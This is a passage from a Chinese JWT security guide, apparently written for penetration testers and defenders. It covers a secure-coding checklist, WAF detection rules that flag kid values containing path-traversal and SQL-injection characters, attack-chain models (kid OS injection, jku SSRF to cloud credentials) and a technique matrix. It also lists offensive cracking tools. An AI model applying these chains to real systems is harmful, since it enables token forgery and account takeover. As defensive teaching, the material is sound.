| 跨服务令牌中继 | 在 `aud` 声明中强制绑定目标应用 | **P2** |

## 13.2 安全编码检查清单

- [ ] JWT 库是否配置了算法白名单（仅允许 HS256/RS256/ES256 之一）？
- [ ] 是否明确禁用了 `alg: none`？
- [ ] 密钥是否通过安全的方式管理和分发（如 JWKS 端点仅返回公钥）？
- [ ] 是否禁用了 Header 中的 `jwk` 参数？
- [ ] 如果使用 `kid`，是否仅用作键查找（非路径/SQL/命令拼接）？
- [ ] `jku`/`x5u` 是否有 URL 白名单？
- [ ] HS256 密钥是否 ≥ 256 bits 且完全随机？
- [ ] 是否设置了 `exp` 且合理（≤ 1 小时）？
- [ ] 是否在服务端维护了令牌撤销机制？
- [ ] 日志中是否记录了 JWT 验证失败事件？

## 13.3 WAF / 检测规则思路

- **算法异常检测**：Header 中 `alg` 为 `none` 或与预期不一致时告警
- **结构异常检测**：JWT 为 2 段（缺签名）或 >3 段（JWE）时检查
- **Kid 异常检测**：`kid` 包含 `../`, `/`, `'`, `;`, `UNION` 等字符时告警
- **jku/x5u 异常检测**：外部密钥 URL 为非白名单域名时告警
- **JWT 长度异常检测**：突然出现的超长或超短 JWT 检查

# 0x0E 攻击链建模

## 14.1 典型攻击链

### 链 1：配置泄露 → 密钥派生 → 身份伪造

```
[配置文件泄露] → [提取 encryptionKey] → [派生 JWT 密钥]
    → [数据库泄露] → [提取用户 hash] → [构造完整伪造令牌]
    → [以管理员身份登录]
```

### 链 2：Kid 注入 → 信息泄露 → 身份伪造

```
[Kid OS 注入] → [启动 HTTP 服务器暴露密钥目录]
    → [获取 JWT 签名私钥] → [伪造任意用户 JWT]
    → [横向移动到其他服务]
```

### 链 3：jku SSRF → 内网探测 → 更大攻击面

```
[jku 指向内网地址] → [内网存活探测]
    → [命中内部 API] → [利用 SSRF 访问云元数据]
    → [获取临时凭证] → [云账户接管]
```

## 14.2 技术矩阵

| 攻击\能力 | 身份伪造 | 权限提升 | SSRF | RCE | 信息泄露 |
|-----------|---------|---------|------|-----|---------|
| None Algorithm | ✓ | ✓ | | | |
| HMAC 爆破 (弱密钥) | ✓ | ✓ | | | |
| RS→HS 密钥混淆 | ✓ | ✓ | | | |
| 嵌入式 JWK | ✓ | ✓ | | | |
| jku 欺骗 | ✓ | ✓ | ✓ | | |
| x5u 欺骗 | ✓ | ✓ | ✓ | | |
| Kid 路径遍历 | ✓ | ✓ | | | |
| Kid SQL 注入 | ✓ | ✓ | | | ✓ |
| Kid OS 注入 | | | | ✓ | ✓ |
| JWE PlainJWT | ✓ | ✓ | | | |

---

## 参考资料

- [jwt_tool — Attack Methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [Burp Suite — JWT Editor Extension](https://github.com/PortSwigger/jwt-editor)
- [Keys to JWT Assessments — TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)
- [n8n Token Forge Chain — config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
- [0xdf — HTB: Principal (JWT walkthrough)](https://0xdf.gitlab.io/2026/03/30/htb-principal.html)
- [CodeAnt AI — Inside CVE-2026-29000: The pac4j JWT Authentication Bypass](https://www.codeant.ai/blogs/pac4j-vulnerability-cve-2026-29000)
- [ECDSA Nonce Reuse — Private Key Recovery](https://asecuritysite.com/encryption/ecd5)
- [IANA JWT Claims Registry](https://www.iana.org/assignments/jwt/jwt.xhtml#claims)
- [PortSwigger — SignSaboteur Burp Extension](https://github.com/d0ge/sign-saboteur)
- [jwtcrack — C JWT Cracker](https://github.com/Sjord/jwtcrack)
- [jwt-pwn — Automated JWT Cracking](https://github.com/mazen160/jwt-pwn)
